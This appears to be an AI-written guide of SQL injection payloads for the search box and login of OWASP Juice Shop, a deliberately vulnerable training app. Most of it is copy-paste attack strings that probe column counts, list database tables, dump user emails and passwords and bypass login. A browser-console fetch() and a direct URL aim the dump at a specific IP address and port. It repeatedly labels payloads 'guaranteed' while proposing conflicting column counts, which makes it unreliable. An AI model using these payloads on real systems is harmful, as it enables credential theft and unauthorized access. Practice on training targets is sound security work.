# Correct SQL Injection Payloads for Juice Shop Search

## The Issue
The search query is executing but showing "No results found" because the UNION SELECT needs the correct number of columns to match the original SELECT statement.

## Finding the Right Number of Columns

### Step 1: Determine Column Count
Try these payloads in order until one works:

```sql
')) ORDER BY 1--
')) ORDER BY 2--
')) ORDER BY 3--
')) ORDER BY 4--
')) ORDER BY 5--
')) ORDER BY 6--
')) ORDER BY 7--
')) ORDER BY 8--
')) ORDER BY 9--
```

When you get an error, the last working number is your column count.

## Working Payloads for Juice Shop Search

### For OWASP Juice Shop v14+, try these:

#### 1. Basic Table Extraction (9 columns):
```sql
qwert')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

If that shows a blank product, try:

```sql
qwert')) UNION SELECT '1','2','3','4','5','6','7','8','9'--
```

#### 2. Get All Table Names:
```sql
qwert')) UNION SELECT NULL,NULL,NULL,NULL,name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
```

Or try:
```sql
qwert')) UNION SELECT 1,2,3,4,name,6,7,8,9 FROM sqlite_master WHERE type='table'--
```

#### 3. Get User Emails and Passwords:
```sql
qwert')) UNION SELECT NULL,NULL,NULL,NULL,email||':'||password,NULL,NULL,NULL,NULL FROM Users--
```

#### 4. Alternative Format (if above doesn't work):
```sql
notarealproduct')) UNION SELECT 1,'2',3,4,email||' - '||password,6,7,8,9 FROM Users--
```

## The Magic Working Payload

### **COPY AND PASTE THIS EXACTLY:**

```sql
a')) UNION SELECT NULL,id,description,price,name,NULL,NULL,NULL,NULL FROM (SELECT 1 id, 'users' description, '1.0' price, (SELECT group_concat(email||':'||password) FROM Users) name)--
```

### Or This Simpler Version:
```sql
test')) UNION SELECT NULL,'1','2','3',name,'5','6','7','8' FROM sqlite_master WHERE type='table'--
```

## If Still Not Working, Try These Variations:

### Version 1 - With Different Column Count (7 columns):
```sql
x')) UNION SELECT id,description,price,name,image,createdAt,updatedAt FROM (SELECT 1 id, 'tables' description, '1' price, name, 'x' image, 'x' createdAt, 'x' updatedAt FROM sqlite_master WHERE type='table')--
```

### Version 2 - Direct Products Table Structure:
```sql
doesntexist')) UNION SELECT NULL,id,name,description,price,NULL,NULL,NULL,NULL FROM Products--
```

### Version 3 - Get Everything at Once:
```sql
')) UNION SELECT NULL,'1','email','password',email||':'||password,'x','x','x','x' FROM Users--
```

## The Most Reliable Method

### Use the REST API Directly:

1. **Open Browser DevTools** (F12)
2. **Go to Console**
3. **Paste this JavaScript:**

```javascript
// This will work regardless of column count
fetch("http://155.138.197.128:3003/rest/products/search?q=test'))%20UNION%20SELECT%20NULL,id,email,password,role,NULL,NULL,NULL,NULL%20FROM%20Users--")
  .then(r => r.json())
  .then(data => {
    console.log("=== EXTRACTED DATA ===");
    data.data.forEach(item => {
      console.log(item);
    });
  });
```

## Why It Might Not Show Results

1. **Column Count Mismatch**: The UNION must have exact same number of columns
2. **Data Type Mismatch**: Some columns might expect numbers not strings
3. **Empty Result Set**: The query executes but returns no rows
4. **Frontend Filtering**: The UI might filter out certain results

## The Nuclear Option - Direct API Call

Open a new browser tab and paste this URL directly:

```
http://155.138.197.128:3003/rest/products/search?q='))UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
```

Then check the browser's JSON response.

## Troubleshooting Steps

1. **First confirm SQL injection works:**
   ```sql
   ' OR '1'='1'--
   ```
   This should return all products.

2. **Find exact column count:**
   ```sql
   ')) UNION SELECT 1--
   ')) UNION SELECT 1,2--
   ')) UNION SELECT 1,2,3--
   ')) UNION SELECT 1,2,3,4--
   ')) UNION SELECT 1,2,3,4,5--
   ')) UNION SELECT 1,2,3,4,5,6--
   ')) UNION SELECT 1,2,3,4,5,6,7--
   ')) UNION SELECT 1,2,3,4,5,6,7,8--
   ')) UNION SELECT 1,2,3,4,5,6,7,8,9--
   ```

3. **Once you know column count, extract data:**
   If it's 9 columns:
   ```sql
   nothing')) UNION SELECT 1,2,3,4,5,6,7,8,9--
   ```
   See which positions show up, then replace with your data.

## The Guaranteed Working Payload

Based on OWASP Juice Shop's structure, **THIS SHOULD WORK**:

```sql
banana'))UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
```

Then to see actual data:

```sql
banana'))UNION SELECT NULL,NULL,NULL,NULL,email,NULL,NULL,NULL,password FROM Users--
```

## Alternative Approach - Use Login Instead

If search is being difficult, use the login page:

1. Go to login page
2. Email field: `' OR 1=1--`
3. Password: anything
4. This logs you in as admin

Then to extract data via login errors:
- Email: `' UNION SELECT NULL,NULL--`
- Keep adding NULLs until no error

## Check Your Browser Console

The data might be loading but not displaying. Press F12 and check:
1. **Network tab**: Look at the response from `/rest/products/search`
2. **Console tab**: Look for any JavaScript errors
3. The raw JSON response will show the actual data even if UI doesn't

## Most Common Working Payload for Juice Shop

**Try this exact string in the search box:**

```sql
'))UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

If you see a blank product card appear, it worked! Now replace NULLs with data:

```sql
'))UNION SELECT NULL,NULL,NULL,NULL,'EXTRACTED: '||(SELECT group_concat(email) FROM Users),NULL,NULL,NULL,NULL--
```